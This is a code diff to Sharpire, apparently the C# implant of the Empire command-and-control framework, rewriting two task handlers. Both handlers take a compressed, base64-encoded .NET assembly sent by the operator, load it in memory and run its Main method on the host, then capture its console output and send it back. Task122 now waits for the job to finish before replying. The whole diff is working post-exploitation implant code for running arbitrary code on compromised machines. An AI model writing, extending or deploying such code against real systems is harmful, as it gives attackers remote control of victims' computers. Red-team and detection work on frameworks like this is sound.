@@ -585,14 +585,12 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Excute assembly tasking
         ////////////////////////////////////////////////////////////////////////////////
-
-        //Since Empire is using the COvenant tasks this is just taken from the Covenant Grunt
-        // https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs#L236
         public Byte[] Task122(PACKET packet)
         {
             const int Delay = 1;
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
+            object synclock = new object(); // Define synclock for thread synchronization
 
             // Split packet data
             string[] parts = packet.data.Split(',');
@@ -602,19 +600,14 @@ namespace Sharpire
                 string base64JsonString = parts[1];
                 string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
 
-                // Manually parse JSON into a dictionary
+                // Manually parse JSON into a list of parameters
                 var parametersList = new List<string>();
-
-                // Remove the braces and split by commas
                 jsonString = jsonString.Trim('{', '}');
                 string[] keyValuePairs = jsonString.Split(',');
 
                 foreach (string pair in keyValuePairs)
                 {
-                    // Split each pair by colon to separate key and value
                     string[] keyValue = pair.Split(':');
-
-                    // Trim quotes and whitespace from key and value
                     if (keyValue.Length == 2)
                     {
                         string value = keyValue[1].Trim().Trim('"');
@@ -622,117 +615,55 @@ namespace Sharpire
                     }
                 }
 
-                // Convert List<string> to string[]
                 string[] parameters = parametersList.ToArray();
 
+                // Decompress and load the assembly
                 byte[] compressedBytes = Convert.FromBase64String(parts[0]);
                 byte[] decompressedBytes = Decompress(compressedBytes);
                 Assembly agentTask = Assembly.Load(decompressedBytes);
-                PropertyInfo streamProp = agentTask.GetType("Program").GetProperty("OutputStream");
 
-                // Create a background thread for the task
+                // If OutputStream is not available, use Console.SetOut only
                 Thread taskThread = new Thread(() =>
                 {
-                    string results = "";
-
-                    if (streamProp == null)
+                    using (StringWriter consoleOutput = new StringWriter())
                     {
-                        StringWriter consoleOutput = new StringWriter();
                         TextWriter originalConsoleOut = Console.Out;
-
-                        Console.SetOut(consoleOutput);
-
-                        agentTask.GetType("Program").GetMethod("Main").Invoke(null, new object[] { parameters });
-
-                        Console.SetOut(originalConsoleOut);
-                    }
-                    else
-                    {
-                        // Execute with OutputStream using anonymous pipes
-                        using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
-                        using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                        try
                         {
-                            streamProp.SetValue(null, pipeClient, null);
-                            Thread invokeThread = new Thread(() =>
+                            Console.SetOut(consoleOutput); // Redirect Console.Out to StringWriter
+                            agentTask.GetType("Program").GetMethod("Main")?.Invoke(null, new object[] { parameters });
+                        }
+                        catch (Exception ex)
+                        {
+                            lock (synclock)
                             {
-                                // Create a StringWriter to capture console output
-                                StringWriter consoleOutput = new StringWriter();
-                                TextWriter originalConsoleOut = Console.Out; // Save the original Console.Out
-
-                                try
-                                {
-                                    Console.SetOut(consoleOutput); // Redirect Console.Out to StringWriter
-
-                                    agentTask.GetType("Program").GetMethod("Main").Invoke(null, new object[] { parameters });
-
-                                }
-                                finally
-                                {
-                                    // Restore the original Console.Out
-                                    Console.SetOut(originalConsoleOut);
-                                }
-                            });
-
-                            invokeThread.Start();
-
-                            using (StreamReader reader = new StreamReader(pipeServer))
-                            {
-                                object synclock = new object();
-                                string currentRead = "";
-
-                                Thread readThread = new Thread(() =>
-                                {
-                                    int count;
-                                    char[] readBuffer = new char[MAX_MESSAGE_SIZE];
-                                    while ((count = reader.Read(readBuffer, 0, readBuffer.Length)) > 0)
-                                    {
-                                        lock (synclock)
-                                        {
-                                            currentRead += new string(readBuffer, 0, count);
-                                        }
-                                    }
-                                });
-                                readThread.Start();
-
-                                while (readThread.IsAlive)
-                                {
-                                    Thread.Sleep(Delay * 1000);
-                                    lock (synclock)
-                                    {
-                                        try
-                                        {
-                                            if (currentRead.Length >= MAX_MESSAGE_SIZE)
-                                            {
-                                                for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                {
-                                                    string chunk = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                }
-                                                currentRead = "";
-                                            }
-                                        }
-                                        catch (ThreadAbortException) { break; }
-                                        catch (Exception) { currentRead = ""; }
-                                    }
-                                }
-                                output += currentRead;
+                                output += $"[ERROR] {ex.Message}";
                             }
-                            invokeThread.Join();
+                        }
+                        finally
+                        {
+                            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                        }
+
+                        lock (synclock) // Safely add console output
+                        {
+                            output += consoleOutput.ToString();
                         }
                     }
-
-                    output += results;
                 });
 
                 // Start the task thread
                 taskThread.IsBackground = true;
                 taskThread.Start();
+                taskThread.Join(); // Wait for task to complete
 
-                // Return an initial confirmation packet as the task runs in the background
-                return EncodePacket(packet.type, "Job started in background", packet.taskId);
+                // Return the final output to the agent once the task completes
+                return EncodePacket(packet.type, output, packet.taskId);
             }
 
             return EncodePacket(packet.type, "Invalid packet", packet.taskId);
         }
+
 
         ////////////////////////////////////////////////////////////////////////////////
         // Kill Job
@@ -771,30 +702,26 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         public Byte[] Task120(PACKET packet)
         {
-            const int Delay = 1;
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
-            string[] parts = packet.data.Split(',');
+            object synclock = new object(); // Define synclock for synchronization
 
+            // Split packet data
+            string[] parts = packet.data.Split(',');
             if (parts.Length > 0)
             {
                 // Assuming the Base64 encoded JSON is in parts[1]
                 string base64JsonString = parts[1];
                 string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
 
-                // Manually parse JSON into a dictionary
+                // Manually parse JSON to extract all values as a generic string array
                 var parametersList = new List<string>();
-
-                // Remove the braces and split by commas
-                jsonString = jsonString.Trim('{', '}');
+                jsonString = jsonString.Trim('{', '}'); // Remove braces
                 string[] keyValuePairs = jsonString.Split(',');
 
                 foreach (string pair in keyValuePairs)
                 {
-                    // Split each pair by colon to separate key and value
                     string[] keyValue = pair.Split(':');
-
-                    // Trim quotes and whitespace from key and value
                     if (keyValue.Length == 2)
                     {
                         string value = keyValue[1].Trim().Trim('"');
@@ -802,119 +729,65 @@ namespace Sharpire
                     }
                 }
 
-                // Convert List<string> to string[]
                 string[] parameters = parametersList.ToArray();
 
+                // Log parameter information for debugging
+                lock (synclock)
+                {
+                    output += $"[DEBUG] Parameters Count: {parameters.Length}\n";
+                    output += $"[DEBUG] Parameters: {string.Join(", ", parameters)}\n";
+                }
+
+                // Decompress and load the assembly
                 byte[] compressedBytes = Convert.FromBase64String(parts[0]);
                 byte[] decompressedBytes = Decompress(compressedBytes);
                 Assembly agentTask = Assembly.Load(decompressedBytes);
-                PropertyInfo streamProp = agentTask.GetType("Program").GetProperty("OutputStream");
-                string results = "";
 
-                // Case when OutputStream is not available
-                if (streamProp == null)
+                // Execute assembly and capture output synchronously
+                using (StringWriter consoleOutput = new StringWriter())
                 {
-                        StringWriter consoleOutput = new StringWriter();
-                        TextWriter originalConsoleOut = Console.Out;
-
-                        Console.SetOut(consoleOutput);
-
-                        results = (string)agentTask.GetType("Program").GetMethod("Main").Invoke(null, new object[] { parameters });
-                        Console.WriteLine(results);
-
-                        results = consoleOutput.ToString();
-                        Console.SetOut(originalConsoleOut);
-                    return EncodePacket(packet.type, results, packet.taskId);
-                }
-                else
-                {
-                    // Case when OutputStream is available
-                    using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
-                    using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                    TextWriter originalConsoleOut = Console.Out;
+                    try
                     {
-                        // Set the OutputStream to the pipe client
-                        streamProp.SetValue(null, pipeClient, null);
+                        Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
 
-                        // Start the main method execution in a new thread to avoid blocking
-                        Thread invokeThread = new Thread(() =>
+                        // Verify parameters and invoke Main method
+                        MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
+                        if (mainMethod != null)
                         {
-                            // Create a StringWriter to capture console output
-                            StringWriter consoleOutput = new StringWriter();
-                            TextWriter originalConsoleOut = Console.Out; // Save the original Console.Out
-
-                            try
-                            {
-                                Console.SetOut(consoleOutput); // Redirect Console.Out to StringWriter
-
-                                // Invoke the Main method and capture any console output
-                                agentTask.GetType("Program").GetMethod("Main").Invoke(null, new object[] { parameters });
-
-                                // Retrieve the captured output after invocation
-                                results = consoleOutput.ToString();
-                            }
-                            finally
-                            {
-                                // Restore the original Console.Out
-                                Console.SetOut(originalConsoleOut);
-                            }
-                        });
-                        invokeThread.Start();
-
-                        using (StreamReader reader = new StreamReader(pipeServer))
-                        {
-                            object synclock = new object();
-                            string currentRead = "";
-
-                            Thread readThread = new Thread(() =>
-                            {
-                                int count;
-                                char[] readBuffer = new char[MAX_MESSAGE_SIZE];
-                                while ((count = reader.Read(readBuffer, 0, readBuffer.Length)) > 0)
-                                {
-                                    lock (synclock)
-                                    {
-                                        currentRead += new string(readBuffer, 0, count);
-                                    }
-                                }
-                            });
-                            readThread.Start();
-
-                            while (readThread.IsAlive)
-                            {
-                                Thread.Sleep(Delay * 1000);
-                                lock (synclock)
-                                {
-                                    try
-                                    {
-                                        if (currentRead.Length >= MAX_MESSAGE_SIZE)
-                                        {
-                                            for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                            {
-                                                string chunk = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                // Process the chunk (send it as a packet, log it, etc.)
-                                            }
-                                            currentRead = "";
-                                        }
-                                        else if (currentRead.Length > 0 && DateTime.Now > (DateTime.Now.Add(TimeSpan.FromSeconds(Delay))))
-                                        {
-                                            // Process remaining output if delay time has passed
-                                        }
-                                    }
-                                    catch (ThreadAbortException) { break; }
-                                    catch (Exception) { currentRead = ""; }
-                                }
-                            }
-                            output += currentRead;
+                            mainMethod.Invoke(null, new object[] { parameters });
                         }
-                        invokeThread.Join(); // Wait for the invocation thread to finish
+                        else
+                        {
+                            lock (synclock)
+                            {
+                                output += "[ERROR] Main method not found in Program class.";
+                            }
+                        }
+                    }
+                    catch (TargetInvocationException ex)
+                    {
+                        lock (synclock)
+                        {
+                            output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n{ex.InnerException?.StackTrace ?? ex.StackTrace}";
+                        }
+                    }
+                    finally
+                    {
+                        Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                    }
+
+                    lock (synclock) // Safely add console output
+                    {
+                        output += consoleOutput.ToString();
                     }
                 }
 
-                output += results;
+                // Return the captured output to the agent
                 return EncodePacket(packet.type, output, packet.taskId);
             }
 
-            return EncodePacket(packet.type, "invalid packet", packet.taskId);
+            return EncodePacket(packet.type, "Invalid packet", packet.taskId);
         }
 
         //Decompress function may want to move this somewhere else at some point
